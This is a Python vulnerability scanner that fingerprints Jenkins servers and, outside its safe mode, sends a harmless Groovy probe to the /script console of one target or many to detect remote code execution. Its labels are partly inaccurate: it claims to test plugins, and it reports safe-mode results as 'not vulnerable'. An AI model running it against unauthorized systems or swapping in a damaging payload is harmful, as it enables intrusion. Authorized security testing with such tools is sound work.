#!/usr/bin/env python3
"""
Jenkins Plugin RCE Scanner
===========================
This script scans Jenkins instances for plugins vulnerable to remote code execution (RCE) via unsafe Groovy script execution.

Vulnerability Details:
  - Some Jenkins plugins do not properly sanitize inputs that lead to server-side Groovy code execution.
  - Exploitability often requires the attacker to have authenticated access to the Jenkins instance but may
    also depend on specific configuration settings.
  - The vulnerability can lead to complete compromise of the Jenkins server.

Usage:
  # Scan a single Jenkins instance
  python jenkins_plugin_rce_scanner.py --target http://jenkins.example.com

  # Scan a list of Jenkins instances
  python jenkins_plugin_rce_scanner.py --list targets.txt --output findings.json

  # Detection-only mode (does not actively probe for RCE)
  python jenkins_plugin_rce_scanner.py --target http://jenkins.example.com --safe

CLI Options:
  --target      URL of a single Jenkins target to scan.
  --list        File containing a list of target URLs, one per line.
  --output      Path to save results in JSON format.
  --safe        Perform detection-only scanning without any active exploitation.
  --concurrency Number of concurrent requests to send (default: 10).
  --no-verify   Disable SSL certificate verification (useful for self-signed certs).

References:
  - [https://nvd.nist.gov](https://nvd.nist.gov)
  - [https://www.jenkins.io/security/](https://www.jenkins.io/security/)
"""

import argparse
import asyncio
import json
import os
import re
import sys
from datetime import datetime
from urllib.parse import urljoin

import httpx
from termcolor import colored

# Constants
JENKINS_FINGERPRINTS = [
    "Jenkins",  # Found in title or headers
    "/manage/",  # Admin page path
    "/login",  # Login page path
]

RCE_PROBE_SCRIPT = "scriptText=(new File('/')).getAbsolutePath()"  # Returns "/"
RCE_PROBE_EXPECTED = "/"

DETECTION_PATHS = [
    "/",  # Main page
    "/login",  # Login path
    "/manage",  # Admin interface
]

SEM = asyncio.Semaphore(10)  # Default concurrency
REQUEST_TIMEOUT = 10


def normalize_url(url: str) -> str:
    """
    Normalize a URL by ensuring it contains the scheme (http/https) and removing trailing slashes.
    """
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")


async def detect_jenkins(client: httpx.AsyncClient, base_url: str):
    """
    Detect whether a target URL is running a Jenkins instance.
    Returns a dictionary with detection results.
    """
    result = {"target": base_url, "detected": False}
    for path in DETECTION_PATHS:
        detection_url = urljoin(base_url, path)
        try:
            response = await client.get(detection_url, timeout=REQUEST_TIMEOUT)
            if any(fingerprint in response.text for fingerprint in JENKINS_FINGERPRINTS):
                result["detected"] = True
                break
        except httpx.RequestError:
            pass

    return result


async def check_rce(client: httpx.AsyncClient, base_url: str):
    """
    Check for remote code execution vulnerability in detected Jenkins instance.
    Returns True if the target is vulnerable, False otherwise.
    """
    rce_endpoint = urljoin(base_url, "/script")
    rce_headers = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        response = await client.post(
            rce_endpoint, 
            data=RCE_PROBE_SCRIPT,
            headers=rce_headers,
            timeout=REQUEST_TIMEOUT,
        )
        if response.is_success and RCE_PROBE_EXPECTED in response.text:
            return True
    except httpx.RequestError:
        pass
    return False


async def scan_target(client: httpx.AsyncClient, target, semaphore, safe_mode):
    """
    Perform scanning on a single target.
    Returns detection and exploit results in JSON-compatible format.
    """
    target = normalize_url(target)
    async with semaphore:
        result = await detect_jenkins(client, target)
        if result["detected"]:
            if not safe_mode:
                result["vulnerable"] = await check_rce(client, target)
            else:
                result["vulnerable"] = None
        return result


async def run_scanner(targets, concurrency, safe_mode, verify_ssl):
    """
    Run the scanner on the list of targets with the specified concurrency.
    """
    results = []
    async with httpx.AsyncClient(verify=verify_ssl) as client:
        tasks = [scan_target(client, target, SEM, safe_mode) for target in targets]
        results = await asyncio.gather(*tasks)
    return results


def display_results(results):
    """
    Print the results to the console in color-coded format.
    """
    for result in results:
        if not result["detected"]:
            print(colored(f"[INFO] {result['target']} - Jenkins not detected", "green"))
        elif result["vulnerable"]:
            print(colored(f"[CRITICAL] {result['target']} - Vulnerable to RCE!", "red"))
        else:
            print(colored(f"[HIGH] {result['target']} - Jenkins detected, but not vulnerable", "yellow"))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Jenkins Plugin RCE Scanner")
    parser.add_argument("--target", help="Target URL to scan")
    parser.add_argument("--list", help="File containing a list of newline-separated target URLs")
    parser.add_argument("--output", help="Path to save JSON results")
    parser.add_argument("--safe", action="store_true", help="Perform detection only (no exploitation)")
    parser.add_argument("--concurrency", type=int, default=10, help="Number of concurrent requests (default: 10)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification (for self-signed certs)")
    args = parser.parse_args()

    if not args.target and not args.list:
        print("Error: Either --target or --list must be specified.")
        sys.exit(1)

    if args.target:
        targets = [args.target]
    elif args.list:
        try:
            with open(args.list, "r") as file:
                targets = [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print(f"Error: File {args.list} not found.")
            sys.exit(1)

    SEM = asyncio.Semaphore(args.concurrency)

    results = asyncio.run(run_scanner(targets, args.concurrency, args.safe, not args.no_verify))

    if args.output:
        with open(args.output, "w") as outfile:
            json.dump(results, outfile, indent=4)
        print(f"Results saved to {args.output}")

    display_results(results)
